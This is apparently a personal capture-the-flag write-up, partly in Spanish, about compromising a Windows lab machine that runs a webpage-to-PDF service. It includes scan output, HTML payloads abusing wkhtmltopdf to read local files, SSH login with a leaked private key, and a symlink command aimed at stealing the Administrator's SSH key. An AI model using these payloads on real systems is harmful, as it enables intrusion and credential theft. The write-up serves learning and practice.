#Pwned! 
```IP
192.168.162.177
```
## Nmap
```
PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:40:e2:ef:21:ea:c1:77:b6:14:a3:f7:04:59:45:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcjA6Du6Xclk6bj2jRxFnRpmqAaGYZBeR4bZ+ZlpEc3HQxgUVtevQcEwV/GkD1uHnkavTJLsV8xf0SxHOxvjlCTHVxCApToP7QQkXH+wNw9kMz8xhzI0fVxvTTWGcOskfxgTfw7AcvYsXmKbJnUwZRaNdr5GtdJqO9jW1WprImYTY7ZSxzfxomZiQj87g21nbY/QSPfeJXbmacl9U52B9KB6StxVCGrS0hL3PIfDbQvGYiDqfH1/0UrE8NsdC3cmf2yMHwrpUXiHv6aMwpOP4WHhsBZgqotqaj5clEq051IylC5RcRGVmPqG5m7Sb1F91L43RLVfp5gSDX/K097bOL
|   256 f8:fb:e3:c6:16:3a:e2:62:d0:e2:ae:d4:f2:9e:6f:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEsNFRln5wL+8mm70Jhj1dYrLiOfcB1bg1sJRbZu84TZhAuaZuab6L3L77D1Iz/o2guD9TyvRvcU3nRIxdvIUxw=
|   256 94:5e:97:ad:f9:0f:81:b6:6b:3b:bd:98:43:c0:0d:6a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPGpJEAiGfo+odXRYF/qTK3JeKYerp7y7Qn6wVd4pByr
80/tcp open  http    syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: WebPage to PDF

```

## Nmap UDP


# Enumeration

## HTTP
Fuzz
```
.htaccess               [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 33ms]
.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 38ms]
Logs                    [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 28ms]
aux                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 32ms]
cgi-bin/                [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 35ms]
com2                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 30ms]
com1                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 33ms]
com4                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 32ms]
com3                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 33ms]
con                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 27ms]
licenses                [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 33ms]
logs                    [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 31ms]
lpt1                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 30ms]
lpt2                    [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 29ms]
nul                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 29ms]
pdfs                    [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 30ms]
phpmyadmin              [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 38ms]
prn                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 30ms]
server-status           [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 31ms]
server-info             [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 31ms]
webalizer               [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 46ms]
```
In pdfs we find a private key
https://medium.com/@parab500/part-1-uncovering-the-vulnerability-how-attackers-can-exploit-ssrf-via-pdf-generation-bf91a42b8e67
https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536
Analyzing pdfs 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241022104848.png?raw=true)
we confirm the version of wkhtmltopdf is 0.12.3
No parece posible extraer información creando pdfs a partir de html malicioso
```
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<body>

<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///Windows/System32/Drivers/etc/hosts");
x.send();
</script>

</body></html>
```
hacktricks payload working
```
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241022112313.png?raw=true)

in fact with the user name p4yl0ad in the webpage and the id_rsa leaked we can ssh into the machine
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241022115219.png?raw=true)

# PrivEsc

## Manual
https://github.com/googleprojectzero/symboliclink-testing-tools
Por alguna razón no funciona lo que a todo dios le funciona
```
.\CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
```
## Automated

### Peass
C:\Users\p4yl0ad\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

### Mimikatz


